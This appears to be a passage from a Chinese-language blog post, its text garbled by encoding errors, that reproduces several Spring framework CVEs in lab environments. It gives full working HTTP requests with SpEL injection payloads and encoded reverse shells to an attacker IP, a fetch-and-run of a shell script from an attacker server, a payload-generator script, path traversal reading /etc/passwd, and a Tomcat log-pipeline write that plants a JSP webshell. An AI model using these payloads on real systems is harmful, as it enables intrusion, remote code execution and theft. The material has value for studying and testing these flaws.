<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/3e294a607bba440aad29c99b3bcb6db7.png" alt="789"></p>
<h2 id="Spring-Data-RCE-CVE-2018-1273"><a href="#Spring-Data-RCE-CVE-2018-1273" class="headerlink" title="Spring Data RCE(CVE-2018-1273)"></a>Spring Data RCE(CVE-2018-1273)</h2><p>å½±å“èŒƒå›´å¦‚â¬‡ï¸ï¼šSpring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
<h3 id="æ¼æ´æŒ‡çº¹-1"><a href="#æ¼æ´æŒ‡çº¹-1" class="headerlink" title="æ¼æ´æŒ‡çº¹"></a>æ¼æ´æŒ‡çº¹</h3><p>ä¸æ˜¯å¾ˆæ˜æ˜¾ï¼Œå¯èƒ½å­˜åœ¨springæ¡†æ¶å’Œæ•°æ®åº“äº¤äº’çš„åœ°æ–¹ï¼ˆä¾‹å¦‚è¡¨å•ï¼‰</p>
<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>ä¸»é¡µé¢æ²¡æœ‰å•¥<br>ä½¿ç”¨ç›®å½•æ‰«æå·¥å…·æ‰«æåˆ°ç›®å½•&#x2F;usersï¼Œè®¿é—®çœ‹çœ‹<br><img src="https://img-blog.csdnimg.cn/f0b8c2b4f54a4554a13d6966b1ba36d9.png" alt="132"><br>éšä¾¿è¾“å…¥ä¸€ç‚¹æŠ“åŒ…<br><img src="https://img-blog.csdnimg.cn/b685efc72dc44c59a87a702f1d347a5f.png" alt="123"></p>
<p>æ”¹ä¸€ä¸‹<br>ä½¿ç”¨dnslogæµ‹è¯•ä¸€ä¸‹</p>
<p>POST:</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;users?page&#x3D;&amp;size&#x3D;5 HTTP&#x2F;1.1
Host: 8.130.100.1xx:8080
Content-Length: 127
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.0.0 Safari&#x2F;537.36
Origin: http:&#x2F;&#x2F;8.130.100.154:8080
Content-Type: application&#x2F;x-www-form-urlencoded
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;8.130.100.154:8080&#x2F;users?page&#x3D;&amp;size&#x3D;5
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8
Cookie: gosession&#x3D;MTY5OTg3OTkyMHxEWDhFQVFMX2dBQUJFQUVRQUFCQV80QUFBUVp6ZEhKcGJtY01CQUFDYVdRR2MzUnlhVzVuRENZQUpEUTFOR00zTmpJMUxUVTROalF0TkdFd1pDMWhOams0TFRRMVptRXhNakEwTjJSa1lRPT18PRHNBt47aG28oC6jqqZpQ79n0DnHBAy1NITTlRpY&#x3D;
Connection: close

username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;ping 9r6b8g.dnslog.cn&quot;)]&#x3D;&amp;password&#x3D;&amp;repeatedPassword&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/1b476068d34b4973863ff9419cabccd7.png" alt="123"><br>é‚£ä¹ˆå°±å¼€å§‹åå¼¹ä¸€ä¸ªshell<br><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64 -d&#125;|&#123;bash -i&#125;&quot;)]=&amp;password=&amp;repeatedPassword=</code></p>
<p>å‘ç°ä¸æˆåŠŸï¼Œä¹Ÿä¸çŸ¥é“å“ªé‡Œå‡ºäº†é—®é¢˜<br>çœ‹ä¸‹ä¸€ç§æ–¹æ³•ï¼š</p>
<p>åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ”¾ä¸€ä¸ªshellè„šæœ¬ã€‚ç„¶åå¼€å¯httpæœåŠ¡è®©å—å®³è€…å»è®¿é—®è¿™ä¸ªåœ°å€ã€‚<br>æœåŠ¡å™¨ï¼š<br>1ã€å»ºç«‹ä¸€ä¸ªshellè„šæœ¬</p>
<blockquote>
<p>exp.sh<br><code>bash -i &gt;&amp; /dev/tcp/8.130.xxx.1x4/80 0&gt;&amp;1</code></p>
</blockquote>
<p>2ã€å¼€å¯HTTPæœåŠ¡</p>
<blockquote>
<p><code>python -m http.server</code><br><img src="https://img-blog.csdnimg.cn/ad824264849544c483b4c50ca6c36610.png" alt="465"></p>
</blockquote>
<p>3ï¼ˆå¯çœç•¥ï¼‰ã€ç„¶åè®©é¶æœºä¸‹è½½è¯¥æ–‡ä»¶åˆ°&#x2F;tmpç›®å½•ä¸‹ã€‚ï¼ˆå…¶ä»–ç›®å½•ä¸‹å¯èƒ½è¦èµ‹äºˆæƒé™ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼‰</p>
<blockquote>
<p><code>wget http://x.x.xx.x/exp.sh</code><br><img src="https://img-blog.csdnimg.cn/fcc99b3be0934b59937aa6c5fa885b8a.png" alt="123"></p>
</blockquote>
<p>4ã€é¶æœºä½¿ç”¨curlå‘½ä»¤å°†exp.shå†™åˆ°&#x2F;tmpç›®å½•ä¸‹ã€‚</p>
<blockquote>
<p><code>curl -o /tmp/exp.sh http://8.xxx.xxx.xx4:8000/exp.sh</code><br><img src="https://img-blog.csdnimg.cn/332e0dae85b04346996732f9db6661f6.png" alt="132"></p>
</blockquote>
<p>5ã€ç„¶åé¶æœºè¿è¡Œshellæ–‡ä»¶</p>
<blockquote>
<p>bash &#x2F;tmp&#x2F;exp.sh</p>
</blockquote>
<p>æˆåŠŸè¿æ¥ä¸Š<br><img src="https://img-blog.csdnimg.cn/0fcc0411c56049c48b0be98c4c47f1a7.png" alt="123"></p>
<h2 id="Spring-Data-REST-RCE-CVE-2017-8046"><a href="#Spring-Data-REST-RCE-CVE-2017-8046" class="headerlink" title="Spring Data REST RCE(CVE-2017-8046)"></a>Spring Data REST RCE(CVE-2017-8046)</h2><p>å½±å“ç‰ˆæœ¬ï¼š</p>
<p>Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3</p>
<p>Spring Boot version &lt; 2.0.0M4</p>
<p>Spring Data release trains &lt; Kay-RC3</p>
<h3 id="æ¼æ´æŒ‡çº¹-2"><a href="#æ¼æ´æŒ‡çº¹-2" class="headerlink" title="æ¼æ´æŒ‡çº¹"></a>æ¼æ´æŒ‡çº¹</h3><p><img src="https://img-blog.csdnimg.cn/9c1a7a21631b4f50ac3c3566cf68edb3.png" alt="132"></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"_links"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"customers"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token property">"href"</span> <span class="token operator">:</span> <span class="token string">"http://x.x.x.x:8080/customers"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"profile"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token property">"href"</span> <span class="token operator">:</span> <span class="token string">"http://x.x.x.x:8080/profile"</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>çœ‹åˆ°jsonæ ¼å¼çš„è¿”å›å€¼ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªRestfulé£æ ¼çš„apiæœåŠ¡å™¨<br>æŒ‡çº¹å°±æ˜¯ç½‘é¡µå…¨æ˜¯json,é‡Œé¢æœ‰ä¸€äº›ç±»</p>
<h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>è®¿é—®&#x2F;customers&#x2F;1ï¼Œç¬¦åˆæ¼æ´æŒ‡çº¹ã€‚<br><img src="https://img-blog.csdnimg.cn/31fee77b694e446b94dc0b35ec794cad.png" alt="465"></p>
<p>PATCHçš„å€¼æ˜¯SpELè¡¨è¾¾å¼ï¼Œæ·»åŠ è¯·æ±‚å¤´ä¸ºContent-Typeï¼šapplication&#x2F;json-patch+json ï¼Œè€Œä¸”å‘½ä»¤éœ€è¦æ”¹ä¸º10è¿›åˆ¶ç¼–ç ã€‚</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">PATCH /customers/1 HTTP/1.1
Host: 8.130.100.154:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: gosession=MTY5OTg3OTkyMHxEWDhFQVFMX2dBQUJFQUVRQUFCQV80QUFBUVp6ZEhKcGJtY01CQUFDYVdRR2MzUnlhVzVuRENZQUpEUTFOR00zTmpJMUxUVTROalF0TkdFd1pDMWhOams0TFRRMVptRXhNakEwTjJSa1lRPT18P_GIRHNBt47aG28oC6jqqZpQ79n0DnHBAy1NITTlRpY=
If-None-Match: "0"
If-Modified-Since: Tue, 21 Nov 2023 13:09:48 GMT
Content-Type: application/json-patch+json
Connection: close
Content-Length: 468

[
  &#123; "op": "replace", 
    "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,52,76,106,69,122,77,67,52,120,77,68,65,117,77,84,85,48,76,122,103,119,73,68,65,43,74,106,69,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125&#125;))/lastname",
    "value": "exploit" 
  &#125;
]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œçš„åè¿›åˆ¶å°±æ˜¯<code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
<p>ç„¶åæœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼Œé¶æœºè¿™è¾¹å†ä½¿ç”¨bpå‘é€ä¸Šè¿°æŠ¥æ–‡<br><img src="https://img-blog.csdnimg.cn/9aa440ec7c234562b7d533f45b55f0b2.png" alt="123"><br>å‘ç°æˆåŠŸåå¼¹shell<br><img src="https://img-blog.csdnimg.cn/c05967577f1b42b98decea4522ce3e43.png" alt="123"></p>
<h2 id="Spring-Web-Flow-RCE-CVE-2017-4971"><a href="#Spring-Web-Flow-RCE-CVE-2017-4971" class="headerlink" title="Spring Web Flow RCE(CVE-2017-4971)"></a>Spring Web Flow RCE(CVE-2017-4971)</h2><p>å½±å“èŒƒå›´<br>Spring Web Flow 2.4.0 - 2.4.4<br>è¯¦ç»†æ¼æ´åˆ†æ<a href="https://paper.seebug.org/322/">Spring Web Flow è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ(CVE-2017-4971)</a></p>
<h3 id="æ¼æ´æŒ‡çº¹-3"><a href="#æ¼æ´æŒ‡çº¹-3" class="headerlink" title="æ¼æ´æŒ‡çº¹"></a>æ¼æ´æŒ‡çº¹</h3><p>æ— æ˜æ˜¾æ¼æ´æŒ‡çº¹ï¼Œåœ¨å„ç§æäº¤è¡¨å•çš„åœ°æ–¹å¯ä»¥å°è¯•</p>
<h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul>
<li>1ã€MvcViewFactoryCreatorå¯¹è±¡çš„useSpringBeanBindingå‚æ•°éœ€è¦è®¾ç½®ä¸ºfalseï¼ˆé»˜è®¤å€¼ï¼‰ </li>
<li>2ã€flow view å¯¹è±¡ä¸­è®¾ç½®BinderConfigurationå¯¹è±¡ä¸ºç©º</li>
</ul>
<h3 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>éšä¾¿ç™»å½•ä¸€ä¸ªè´¦æˆ·ï¼Œè´¦å·å¯†ç éƒ½å·²ç»ç»™å‡º<br><img src="https://img-blog.csdnimg.cn/15f73395f6ec4ae187a14ac8bf9cc982.png" alt="12"><br>ç™»å½•ä¹‹åéšä¾¿è¿›å…¥ä¸€ä¸ªæˆ¿é—´<br><img src="https://img-blog.csdnimg.cn/b176f94d4f0e4299a75eff0f33298237.png" alt="123"><br>ä¹‹åç‚¹å‡»é¢„å®šé…’åº—(Book Hotel)<br>ç„¶åå°†ä¿¡æ¯éšä¾¿å®Œå–„ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/4ccc00442da546639f1d0544b9f1a4e6.png" alt="456"><br>ç‚¹å‡»confirmï¼Œæ­¤æ—¶è®°å¾—å¼€å¯æŠ“åŒ…ï¼Œå› ä¸ºè¿™é‡Œæœ‰csrfçš„tokené™åˆ¶ï¼Œæ‰€ä»¥é‡æ”¾æ˜¯æ²¡æœ‰ç”¨çš„<br>å…ˆä½¿ç”¨dnslogæµ‹è¯•ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/9d09a54848f540838c24075f2f941181.png" alt="123"><br> <img src="https://img-blog.csdnimg.cn/4670469add45474db6a6f9c04a5f022d.png" alt="123"></p>
<p>åå¼¹shell</p>
<blockquote>
<p><code>_eventId_confirm=&amp;_csrf=eed53409-7b2a-4b0e-b00b-27e6beb51aeb&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/8.130.100.154/80+0&gt;%261&quot;)).start()=vulhub</code><br>ï¼ˆè®°å¾—è¿™æ ·urlç¼–ç ä¸€ä¸‹ï¼Œä¸ç„¶åå¼¹ä¸æˆåŠŸï¼Œå·²ç»è¯•è¿‡äº†ã€‚ã€‚ã€‚ï¼‰<br><img src="https://img-blog.csdnimg.cn/14655ebd8e5d42c7b07d0bbd8d4fdfc7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/e8222bea59ba4ceda7ebd4dfcfbda40a.png" alt="123"></p>
</blockquote>
<h2 id="Spring-Security-OAuth2-RCE-CVE-2016-4977"><a href="#Spring-Security-OAuth2-RCE-CVE-2016-4977" class="headerlink" title="Spring Security OAuth2 RCE(CVE-2016-4977)"></a>Spring Security OAuth2 RCE(CVE-2016-4977)</h2><p>å½±å“èŒƒå›´ï¼š<br>Spring Security OAuth 2.0 - 2.0.9<br>Spring Secutiry OAuth 1.0-1.0.5</p>
<h3 id="æ¼æ´æŒ‡çº¹-4"><a href="#æ¼æ´æŒ‡çº¹-4" class="headerlink" title="æ¼æ´æŒ‡çº¹"></a>æ¼æ´æŒ‡çº¹</h3><p>è®¿é—®</p>
<blockquote>
<p>&#x2F;oauth&#x2F;authorize?response_type&#x3D;${2*2}&amp;client_id&#x3D;acme&amp;scope&#x3D;openid&amp;redirect_uri&#x3D;<a href="http://test/">http://test</a></p>
</blockquote>
<p>å­˜åœ¨ç™»å½•é¡µé¢<br>é»˜è®¤è´¦å·å¯†ç admin&#x2F;admin<br>ç„¶åå›æ˜¾è¿™ä¸ªç”»é¢ <img src="https://img-blog.csdnimg.cn/fabd0d40d6cb4ba5b54f44239db9a84e.png" alt="45"><br>è¯´æ˜å°±æ˜¯å­˜åœ¨æ¼æ´<br>payloadç”Ÿæˆè„šæœ¬</p>
<pre class="line-numbers language-python3" data-language="python3"><code class="language-python3">#!&#x2F;usr&#x2F;bin&#x2F;env python

message &#x3D; input(&#39;Enter message to encode:&#39;)

poc &#x3D; &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])

for ch in message[1:]:
   poc +&#x3D; &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) 

poc +&#x3D; &#39;)&#125;&#39;

print(poc)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/f3f7fc1fe795429caa2737e39ad6afe9.png" alt="123"><br>å¤åˆ¶ä¸€ä¸‹ç»“æœå¹¶ä¸”æ‹¼æ¥åˆ°è¿™é‡Œ<br><code>oauth/authorize?response_type=$&#123;POC&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code><br>å‘ç°æ— å›æ˜¾ <img src="https://img-blog.csdnimg.cn/fc8d3e0dde30449fb8fcd267f88faadd.png" alt="12"></p>
<p>å¼¹ä¸ªshellè¯•ä¸€è¯•<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br><img src="https://img-blog.csdnimg.cn/f7b18d6679974a3191d4e86d142da821.png" alt="123"><br>æœåŠ¡å™¨ç›‘å¬ç«¯å£</p>
<blockquote>
<p>nc -lvnp 80</p>
</blockquote>
<p>payload</p>
<blockquote>
<p><code>http://8.130.100.154:8080/oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(85)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></p>
</blockquote>
<p>åå¼¹æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/2a71fd763f72413d86ed417ce91832a0.png" alt="12"></p>
<h2 id="Spring-Boot-ç›®å½•éå†-CVE-2021-21234"><a href="#Spring-Boot-ç›®å½•éå†-CVE-2021-21234" class="headerlink" title="Spring Boot ç›®å½•éå†(CVE-2021-21234)"></a>Spring Boot ç›®å½•éå†(CVE-2021-21234)</h2><p>æ¼æ´å½±å“èŒƒå›´ï¼šspring boot actuator logview &lt; 0.2.13</p>
<h3 id="æ¼æ´æŒ‡çº¹-5"><a href="#æ¼æ´æŒ‡çº¹-5" class="headerlink" title="æ¼æ´æŒ‡çº¹"></a>æ¼æ´æŒ‡çº¹</h3><p>é¦–é¡µä¸ºok<br>oré¦–é¡µä¸ºHellow Spring Boot<br><img src="https://img-blog.csdnimg.cn/direct/7a18b3c2c571452289656b6893ec2844.png" alt="132"></p>
<h3 id="æ¼æ´å¤ç°-3"><a href="#æ¼æ´å¤ç°-3" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">#Windows
&#123;&#123;BaseURL&#125;&#125;/manage/log/view?filename=/windows/win.ini&amp;base=../../../../../../../../../../

#Windows
&#123;&#123;BaseURL&#125;&#125;/log/view?filename=/windows/win.ini&amp;base=../../../../../../../../../../

#Linux
&#123;&#123;BaseURL&#125;&#125;/manage/log/view?filename=/etc/passwd&amp;base=../../../../../../../../../../

#Linux
&#123;&#123;BaseURL&#125;&#125;/log/view?filename=/etc/passwd&amp;base=../../../../../../../../../../<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/42739cd404f743eabf10ed0a61072a10.png" alt="123"></p>
<h2 id="Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980"><a href="#Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980" class="headerlink" title="Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)"></a>Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)</h2><p>å½±å“ç‰ˆæœ¬ï¼š<br>Spring Data MongoDB &#x3D;&#x3D; 3.4.0<br>3.3.0 &lt;&#x3D; Spring Data MongoDB &lt;&#x3D; 3.3.4</p>
<h3 id="æ¼æ´æŒ‡çº¹-6"><a href="#æ¼æ´æŒ‡çº¹-6" class="headerlink" title="æ¼æ´æŒ‡çº¹"></a>æ¼æ´æŒ‡çº¹</h3><p>æ— æ˜æ˜¾æŒ‡çº¹ï¼Œå¦‚æœå­˜åœ¨spring+mongodb çš„ç»„åˆå¯ä»¥ç›²æ‰“ä¸€ä¸‹</p>
<h3 id="æ¼æ´å¤ç°-4"><a href="#æ¼æ´å¤ç°-4" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><blockquote>
<p>name&#x3D;T(java.lang.String).forName(â€˜java.lang.Runtimeâ€™).getRuntime().exec(â€˜lsâ€™)</p>
</blockquote>
<h2 id="Spring-Framework-RCE-CVE-2022-22965"><a href="#Spring-Framework-RCE-CVE-2022-22965" class="headerlink" title="Spring Framework RCE(CVE-2022-22965)"></a>Spring Framework RCE(CVE-2022-22965)</h2><p>å½±å“ç‰ˆæœ¬ï¼š<br>jdk9+ &amp; SpringåŠå…¶è¡ç”Ÿæ¡†æ¶ &amp; ä½¿ç”¨tomcatéƒ¨ç½²springé¡¹ç›® &amp; ä½¿ç”¨äº†POJOå‚æ•°ç»‘å®š &amp; ï¼ˆSpring Framework 5.3.x - 5.3.18 ï½œ Spring Framework 2.x - 5.2.20ï¼‰</p>
<h3 id="æ¼æ´æŒ‡çº¹-7"><a href="#æ¼æ´æŒ‡çº¹-7" class="headerlink" title="æ¼æ´æŒ‡çº¹"></a>æ¼æ´æŒ‡çº¹</h3><p>æ— æ˜æ˜¾æ¼æ´æŒ‡çº¹ï¼Œçœ‹åˆ°è¯†åˆ«åˆ° Spring+Java çš„ç«™å¯ä»¥ç›²æ‰“ä¸€ä¸‹</p>
<h3 id="æ¼æ´å¤ç°-5"><a href="#æ¼æ´å¤ç°-5" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">
class.module.classLoader.resources.context.parent.pipeline.first.pattern=
æ„å»ºæ–‡ä»¶çš„å†…å®¹

class.module.classLoader.resources.context.parent.pipeline.first.suffix=
ä¿®æ”¹tomcatæ—¥å¿—æ–‡ä»¶åç¼€

class.module.classLoader.resources.context.parent.pipeline.first.directory=
å†™å…¥æ–‡ä»¶æ‰€åœ¨çš„ç½‘ç«™æ ¹ç›®å½•

class.module.classLoader.resources.context.parent.pipeline.first.prefix=
å†™å…¥æ–‡ä»¶åç§°

class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
æ–‡ä»¶æ—¥æœŸæ ¼å¼ï¼ˆå®é™…æ„é€ ä¸ºç©ºå€¼å³å¯ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯ä»¥ä¸€ä¸ªä¸€ä¸ªçš„GETå‘é€ï¼Œæˆ–è€…ç›´æ¥ä¸€æ¬¡æ€§POSTå‘é€ï¼ŒGETå½¢å¦‚ä¸‹é¢è¿™ç§å½¢å¼è¯´æ˜payloadæˆåŠŸ</p>
<h4 id="GETå‘é€"><a href="#GETå‘é€" class="headerlink" title="GETå‘é€"></a>GETå‘é€</h4><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.parent.pipeline.first.pattern&#x3D;spring
class.module.classLoader.resources.context.parent.pipeline.first.suffix&#x3D;.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory&#x3D;webapps&#x2F;ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix&#x3D;shell
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>http://8.130.100.154:8080/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</code><br>æœ€åè®¿é—®shell.jsp<br><img src="https://img-blog.csdnimg.cn/direct/ab38e2952ee84292be53ac28959e6403.png" alt="132"></p>
